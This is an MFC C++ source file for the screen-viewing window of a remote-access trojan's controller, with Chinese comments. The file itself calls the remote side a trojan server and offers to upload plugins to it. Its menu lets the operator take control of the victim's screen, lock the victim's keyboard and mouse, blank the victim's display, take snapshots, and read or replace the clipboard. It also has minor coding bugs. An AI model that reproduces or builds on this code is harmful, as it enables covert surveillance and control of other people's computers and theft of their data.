// ScreenForm.cpp : implementation file
//

#include "stdafx.h"
#include "resource.h"
#include "ScreenForm.h"
#include "ScreenPlugin.h"
#include "macro.h"
#include "Buffer.h"

enum
{
	IDM_CONTROL = 0x0010,
	IDM_SEND_CTRL_ALT_DEL,
	IDM_TRACE_CURSOR,	// 跟踪显示远程鼠标
	IDM_BLOCK_INPUT,	// 锁定远程计算机输入
	IDM_BLANK_SCREEN,	// 黑屏
	IDM_CAPTURE_LAYER,	// 捕捉层
	IDM_SAVEDIB,		// 保存图片
	IDM_GET_CLIPBOARD,	// 获取剪贴板
	IDM_SET_CLIPBOARD,	// 设置剪贴板
	IDM_ALGORITHM_SCAN,	// 隔行扫描算法
	IDM_ALGORITHM_DIFF,	// 差异比较算法
};

// ScreenForm

IMPLEMENT_DYNCREATE(ScreenForm, CFormView)

ScreenForm::ScreenForm()
	: CFormView(ScreenForm::IDD)
{
	KDebug(__FUNCTION__);
	
	memset(&m_MMI, 0, sizeof(MINMAXINFO));
	m_bIsCtrl = false; // 默认不控制
	m_Init = false;
	m_nCount = 0;
	m_bCursorIndex = 1;
	m_FirstBMP = NULL;
	m_NextBMP = NULL;
}

ScreenForm::~ScreenForm()
{
	KDebug(__FUNCTION__);
}

void ScreenForm::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(ScreenForm, CFormView)
	ON_WM_PAINT()
	ON_WM_SIZE()
	ON_WM_CLOSE()
	ON_WM_DESTROY()
	ON_WM_HSCROLL()
	ON_WM_VSCROLL()	
END_MESSAGE_MAP()


// ScreenForm diagnostics

#ifdef _DEBUG
void ScreenForm::AssertValid() const
{
	CFormView::AssertValid();
}

#ifndef _WIN32_WCE
void ScreenForm::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif
#endif //_DEBUG

void ScreenForm::OnSize(UINT nType, int cx, int cy) 
{
	CFormView::OnSize(nType, cx, cy);

	// TODO: Add your message handler code here
	if (!IsWindowVisible() || m_Init == false)
		return;
	
	RECT rect;
	GetClientRect(&rect);
	KDebug("GetClientRect %d %d %dx%d", rect.left, rect.top, rect.right, rect.bottom);
	
	if ((rect.right + m_HScrollPos) > m_NewWidth)	
		InterlockedExchange((PLONG)&m_HScrollPos, m_NewWidth - rect.right);
	
	if ((rect.bottom + m_VScrollPos) > m_NewHeight)
		InterlockedExchange((PLONG)&m_VScrollPos, m_NewHeight - rect.bottom);

	SetScrollPos(SB_HORZ, m_HScrollPos);
 	SetScrollPos(SB_VERT, m_VScrollPos);

	if (rect.right >= m_NewWidth && rect.bottom >= m_NewHeight)
	{
		ShowScrollBar(SB_BOTH, false);
		InterlockedExchange((PLONG)&m_HScrollPos, 0);
		InterlockedExchange((PLONG)&m_VScrollPos, 0);
 		RECT	rectClient, rectWindow;
 		
		GetWindowRect(&rectWindow);
 		KDebug("GetWindowRect %d %d %d %d", rectWindow.top, rectWindow.left,
			rectWindow.right, rectWindow.bottom);
 		
		GetClientRect(&rectClient);
 		KDebug("GetClientRect %d %d %d %d", rectClient.top, rectClient.left,
			rectClient.right, rectClient.bottom);
 		
		ClientToScreen(&rectClient);
		KDebug("ClientToScreen %d %d %d %d", rectClient.top, rectClient.left,
			rectClient.right, rectClient.bottom);

		
		// 边框的宽度
		int	nBorderWidth = rectClient.left - rectWindow.left;

		rectWindow.right = rectClient.left + nBorderWidth + m_NewWidth;
		rectWindow.bottom = rectClient.top + m_NewHeight + nBorderWidth;

		//KDebug("MoveWindow %d %d", rectWindow.right, rectWindow.bottom);
 		//MoveWindow(&rectWindow);
	}
	else ShowScrollBar(SB_BOTH, true);
}

void ScreenForm::OnInitialUpdate()
{
	CFormView::OnInitialUpdate();
	GetParentFrame()->RecalcLayout();
	ResizeParentToFit();

	SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_CONTROL, "控制屏幕(&Y)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SEND_CTRL_ALT_DEL, "发送Ctrl-Alt-Del(&K)");
		pSysMenu->AppendMenu(MF_STRING, IDM_TRACE_CURSOR, "跟踪服务端鼠标(&T)");
		pSysMenu->AppendMenu(MF_STRING, IDM_BLOCK_INPUT, "锁定服务端鼠标和键盘(&L)");
		pSysMenu->AppendMenu(MF_STRING, IDM_BLANK_SCREEN, "服务端黑屏(&B)");
		pSysMenu->AppendMenu(MF_STRING, IDM_CAPTURE_LAYER, "捕捉层(导致鼠标闪烁)(&L)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, "保存快照(&S)");
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, "获取剪贴板(&R)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, "设置剪贴板(&L)");
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_ALGORITHM_SCAN, "隔行扫描算法(&S)");
		pSysMenu->AppendMenu(MF_STRING, IDM_ALGORITHM_DIFF, "差异比较算法(&X)");
	}
	
	// TODO: Add extra initialization here
	m_HScrollPos = 0;
	m_VScrollPos = 0;
	m_hRemoteCursor = LoadCursor(NULL, IDC_ARROW);

	ICONINFO CursorInfo;
	::GetIconInfo(m_hRemoteCursor, &CursorInfo);
	if (CursorInfo.hbmMask != NULL)
		::DeleteObject(CursorInfo.hbmMask);
	if (CursorInfo.hbmColor != NULL)
		::DeleteObject(CursorInfo.hbmColor);
	m_dwCursor_xHotspot = CursorInfo.xHotspot;
	m_dwCursor_yHotspot = CursorInfo.yHotspot;

	m_RemoteCursorPos.x = 0;
	m_RemoteCursorPos.x = 0;
	m_bIsTraceCursor = false;

	// 初始化窗口大小结构
	m_hDC = ::GetDC(m_hWnd);
	m_hMemDC = CreateCompatibleDC(m_hDC);
	m_hFullBitmap = CreateDIBSection(m_hDC, m_FirstBMP, DIB_RGB_COLORS, &m_lpScreenDIB, NULL, NULL);
	SelectObject(m_hMemDC, m_hFullBitmap);
	SetScrollRange(SB_HORZ, 0, 1024);  
	SetScrollRange(SB_VERT, 0, 768);
}

void ScreenForm::OnDestroy()
{
	// TODO: Add your message handler code here and/or call default
	KDebug(__FUNCTION__);
	ScreenPlugin::SendScreenCmd(CONTROL_CLOSE_SCREEN);
}

void ScreenForm::OnClose()
{
	// TODO: Add your message handler code here and/or call default
	KDebug(__FUNCTION__);
	ScreenPlugin::SendScreenCmd(CONTROL_CLOSE_SCREEN);

	::ReleaseDC(m_hWnd, m_hDC);
	DeleteObject(m_hFullBitmap);

	if (m_FirstBMP)
		delete m_FirstBMP;
	if (m_NextBMP)
		delete m_NextBMP;
	SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_ARROW));

	m_bIsCtrl = false;

	CFormView::OnClose();
}

void ScreenForm::OnPaint() 
{
	CPaintDC dc(this); // device context for painting
	
	// TODO: Add your message handler code here
	if (m_Init == false)
	{
		DrawTipString("准备连接，请稍后......");
		return;
	}

	BitBlt(m_hDC, 0, 0, m_NewWidth, m_NewHeight, m_hMemDC, m_HScrollPos, m_VScrollPos, SRCCOPY);

	// Draw the cursor
	/*
	if (m_bIsTraceCursor)
		DrawIconEx(
			m_hDC,									// handle to device context 
			m_RemoteCursorPos.x - ((int) m_dwCursor_xHotspot) - m_HScrollPos, 
			m_RemoteCursorPos.y - ((int) m_dwCursor_yHotspot) - m_VScrollPos,
			m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex),	// handle to icon to draw 
			0,0,										// width of the icon 
			0,											// index of frame in animated cursor 
			NULL,										// handle to background brush 
			DI_NORMAL | DI_COMPAT						// icon-drawing flags 
			);
			*/
	// Do not call CDialog::OnPaint() for painting messages
}

void ScreenForm::OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar) 
{
	// TODO: Add your message handler code here and/or call default
	
	SCROLLINFO si;
	int	i;
	si.cbSize = sizeof(SCROLLINFO);
	si.fMask = SIF_ALL;
	GetScrollInfo(SB_HORZ, &si);
	
	switch (nSBCode)
	{
	case SB_LINEUP:
		i = nPos - 1;
		break;
	case SB_LINEDOWN:
		i = nPos + 1;
		break;
	case SB_THUMBPOSITION:
	case SB_THUMBTRACK:
		i = si.nTrackPos;
		break;
	default:
		return;
	}
	
 	i = max(i, si.nMin);
	i = min(i, (int)(si.nMax - si.nPage + 1));

	RECT rect;
 	GetClientRect(&rect);

	if ((rect.right + i) > m_NewWidth)
		i = m_NewWidth - rect.right;

	InterlockedExchange((PLONG)&m_HScrollPos, i);
	
	SetScrollPos(SB_HORZ, m_HScrollPos);
	
	OnPaint();
	CFormView::OnHScroll(nSBCode, nPos, pScrollBar);
}

void ScreenForm::OnVScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar) 
{
	// TODO: Add your message handler code here and/or call default
	SCROLLINFO si;
	int	i;
	si.cbSize = sizeof(SCROLLINFO);
	si.fMask = SIF_ALL;
	GetScrollInfo(SB_VERT, &si);
	
	switch (nSBCode)
	{
	case SB_LINEUP:
		i = nPos - 1;
		break;
	case SB_LINEDOWN:
		i = nPos + 1;
		break;
	case SB_THUMBPOSITION:
	case SB_THUMBTRACK:
		i = si.nTrackPos;
		break;
	default:
		return;
	}
	
 	i = max(i, si.nMin);
 	i = min(i, (int)(si.nMax - si.nPage + 1));

	RECT rect;
	GetClientRect(&rect);
	
	if ((rect.bottom + i) > m_NewHeight)
		i = m_NewHeight;

	InterlockedExchange((PLONG)&m_VScrollPos, i);

	SetScrollPos(SB_VERT, i);
	OnPaint();
	CFormView::OnVScroll(nSBCode, nPos, pScrollBar);
}

void ScreenForm::InitMMI()
{
	RECT	rectClient, rectWindow;
	GetWindowRect(&rectWindow);
	GetClientRect(&rectClient);
	ClientToScreen(&rectClient);
	
	int	nBorderWidth = rectClient.left - rectWindow.left; // 边框宽
	int	nTitleWidth = rectClient.top - rectWindow.top; // 标题栏的高度

	int	nWidthAdd = nBorderWidth * 2 + GetSystemMetrics(SM_CYHSCROLL);
	int	nHeightAdd = nTitleWidth + nBorderWidth + GetSystemMetrics(SM_CYVSCROLL);
	int	nMinWidth = 400 + nWidthAdd;
	int	nMinHeight = 300 + nHeightAdd;
	int	nMaxWidth = m_FirstBMP->bmiHeader.biWidth + nWidthAdd;
	int	nMaxHeight = m_FirstBMP->bmiHeader.biHeight + nHeightAdd;
	
	// 最小的Track尺寸
	m_MMI.ptMinTrackSize.x = nMinWidth;
	m_MMI.ptMinTrackSize.y = nMinHeight;
	
	// 最大化时窗口的位置
	m_MMI.ptMaxPosition.x = 1;
	m_MMI.ptMaxPosition.y = 1;
	
	// 窗口最大尺寸
	m_MMI.ptMaxSize.x = nMaxWidth;
	m_MMI.ptMaxSize.y = nMaxHeight;
	
	// 最大的Track尺寸也要改变
	m_MMI.ptMaxTrackSize.x = nMaxWidth;
	m_MMI.ptMaxTrackSize.y = nMaxHeight;
}

void ScreenForm::OnOperationFailed(unsigned short cmd, unsigned short resp)
{
	if(cmd == CONTROL_CLOSE_SCREEN || resp == ERR_EXIST)	return;
	
	CString errMsg;
	if(resp == ERR_NOTHISMODULE)
		errMsg = "木马服务端不支持该模块，请上传相应的插件";
	else
		errMsg = "未知错误";
	KDebug("%s %x %d", errMsg, cmd, resp);
	MessageBox(errMsg, "视频监控", MB_OK|MB_ICONHAND);
}

void ScreenForm::ResetScreen(void* data)
{
	CBuffer* buff = (CBuffer*)data;
	UINT	nBISize = buff->GetBufferLen();
	m_Init = true;

	int	nOldWidth = 0, nOldHeight = 0;
	if (m_FirstBMP != NULL)
	{
		nOldWidth = m_FirstBMP->bmiHeader.biWidth;
		nOldHeight = m_FirstBMP->bmiHeader.biHeight;
	}

	delete[] m_FirstBMP;
	delete[] m_NextBMP;
	m_FirstBMP = (LPBITMAPINFO)new BYTE[nBISize];
	m_NextBMP = (LPBITMAPINFO)new BYTE[nBISize];

	memcpy(m_FirstBMP, buff->GetBuffer(0), nBISize);
	memcpy(m_NextBMP,buff->GetBuffer(0), nBISize);
	m_NewWidth = m_FirstBMP->bmiHeader.biWidth;
	m_NewHeight = m_FirstBMP->bmiHeader.biHeight;
	m_ImgSize = m_FirstBMP->bmiHeader.biSizeImage;

	KDebug("%d %dx%d", m_ImgSize, m_NewWidth, m_NewHeight);

	DeleteObject(m_hFullBitmap);
	m_hFullBitmap = CreateDIBSection(m_hDC, m_FirstBMP, DIB_RGB_COLORS, &m_lpScreenDIB, NULL, NULL);
	SelectObject(m_hMemDC, m_hFullBitmap);

	memset(&m_MMI, 0, sizeof(MINMAXINFO));
	InitMMI();

	// 分辨率发生改变
	if (nOldWidth != m_NewWidth || nOldHeight != m_NewHeight)
	{
		RECT rectClient, rectWindow;
		GetWindowRect(&rectWindow);
		GetClientRect(&rectClient);
		ClientToScreen(&rectClient);
		
		// 计算ClientRect与WindowRect的差距（标题栏，滚动条）
		rectWindow.right = m_NewWidth +  rectClient.left + (rectWindow.right - rectClient.right);
		rectWindow.bottom = m_NewHeight + rectClient.top + (rectWindow.bottom - rectClient.bottom);
		MoveWindow(&rectWindow);
	}

	DrawTipString("初始化视频，请稍后......");
}

void ScreenForm::DrawFirstScreen(void* data)
{
	CBuffer* buff = (CBuffer*)data;
	UINT	nBISize = buff->GetBufferLen();

	m_bIsFirst = false;
	memcpy(m_lpScreenDIB, buff->GetBuffer(0), m_ImgSize);
	KDebug("%d %d", m_ImgSize, nBISize);

	//Invalidate(FALSE);

	OnPaint();
}

void ScreenForm::DrawNextScreenRect(void* data)
{
	// 根据鼠标是否移动和鼠标是否在变化的区域判断是否重绘鼠标，防止鼠标闪烁
	CBuffer* buff = (CBuffer*)data;
	bool	bIsReDraw = false;
	int		nHeadLength = 1 + sizeof(POINT) + sizeof(BYTE); //算法 + 光标位置 + 光标类型索引
	LPVOID	lpFirstScreen = m_lpScreenDIB;
	LPVOID	lpNextScreen = buff->GetBuffer(nHeadLength);
	DWORD	dwBytes = buff->GetBufferLen() - nHeadLength;

	// 保存上次鼠标所在的位置
	RECT	rectOldPoint;
	::SetRect(&rectOldPoint, m_RemoteCursorPos.x, m_RemoteCursorPos.y, 
		m_RemoteCursorPos.x + m_dwCursor_xHotspot, m_RemoteCursorPos.y + m_dwCursor_yHotspot);

	memcpy(&m_RemoteCursorPos, buff->GetBuffer(0), sizeof(POINT));

	//////////////////////////////////////////////////////////////////////////
	// 判断鼠标是否移动
	if ((rectOldPoint.left != m_RemoteCursorPos.x) || (rectOldPoint.top != 
		m_RemoteCursorPos.y))
		bIsReDraw = true;

	// 光标类型发生变化
	int	nOldCursorIndex = m_bCursorIndex;
	m_bCursorIndex = buff->GetBuffer(9)[0];
	/*
	if (nOldCursorIndex != m_bCursorIndex)
	{
		bIsReDraw = true;
		if (m_bIsCtrl && !m_bIsTraceCursor)
			SetClassLong(m_hWnd, GCL_HCURSOR, 
			(LONG)m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex));
	}
	*/

	// 判断鼠标所在区域是否发生变化
	DWORD	dwOffset = 0;
	while (dwOffset < dwBytes && !bIsReDraw)
	{
		LPRECT	lpRect = (LPRECT)((LPBYTE)lpNextScreen + dwOffset);
		RECT rectDest;		
		if (IntersectRect(&rectDest, &rectOldPoint, lpRect))
			bIsReDraw = true;
		dwOffset += sizeof(RECT) + m_NextBMP->bmiHeader.biSizeImage;
	}
	bIsReDraw = bIsReDraw && m_bIsTraceCursor;
	//////////////////////////////////////////////////////////////////////////

	dwOffset = 0;
	while (dwOffset < dwBytes)
	{
		LPRECT	lpRect = (LPRECT)((LPBYTE)lpNextScreen + dwOffset);
		int	nRectWidth = lpRect->right - lpRect->left;
		int	nRectHeight = lpRect->bottom - lpRect->top;

		m_NextBMP->bmiHeader.biWidth = nRectWidth;
		m_NextBMP->bmiHeader.biHeight = nRectHeight;
		m_NextBMP->bmiHeader.biSizeImage = (((m_NextBMP->bmiHeader.biWidth * m_NextBMP->bmiHeader.biBitCount + 31) & ~31) >> 3) 
			* m_NextBMP->bmiHeader.biHeight;

		StretchDIBits(m_hMemDC, lpRect->left, lpRect->top, nRectWidth,
			nRectHeight, 0, 0, nRectWidth, nRectHeight, (LPBYTE)lpNextScreen + dwOffset + sizeof(RECT),
     	 		   m_NextBMP, DIB_RGB_COLORS, SRCCOPY);

		// 不需要重绘鼠标的话，直接重绘变化的部分
		if (!bIsReDraw)
			StretchDIBits(m_hDC, lpRect->left - m_HScrollPos, lpRect->top - m_VScrollPos, nRectWidth,
 				nRectHeight, 0, 0, nRectWidth, nRectHeight, (LPBYTE)lpNextScreen + dwOffset + sizeof(RECT),
				m_NextBMP, DIB_RGB_COLORS, SRCCOPY);

		dwOffset += sizeof(RECT) + m_NextBMP->bmiHeader.biSizeImage;
	}

	if (bIsReDraw) OnPaint();	
}

void ScreenForm::ProcessData(WPARAM wp)
{
	DispatchData* data = (DispatchData*)wp;
	control_header* header = data->recvData.header;
	unsigned short cmd = header->command;
	unsigned short resp = header->response;
	int dataLen = header->dataLen;
	int seq = header->seq;
	void* body = data->recvData.body;

	if(resp != 0)
	{
		OnOperationFailed(cmd, resp);
		return;
	}
}

void ScreenForm::DrawTipString(CString str)
{
	RECT rect;
	GetClientRect(&rect);
	COLORREF bgcol = RGB(0x00, 0x00, 0x00);	
	COLORREF oldbgcol  = SetBkColor(m_hDC, bgcol);
	COLORREF oldtxtcol = SetTextColor(m_hDC, RGB(0xff,0x00,0x00));
	ExtTextOut(m_hDC, 0, 0, ETO_OPAQUE, &rect, NULL, 0, NULL);

	DrawText (m_hDC, str, -1, &rect,
		DT_SINGLELINE | DT_CENTER | DT_VCENTER);
	
	SetBkColor(m_hDC, oldbgcol);
	SetTextColor(m_hDC, oldtxtcol);
}
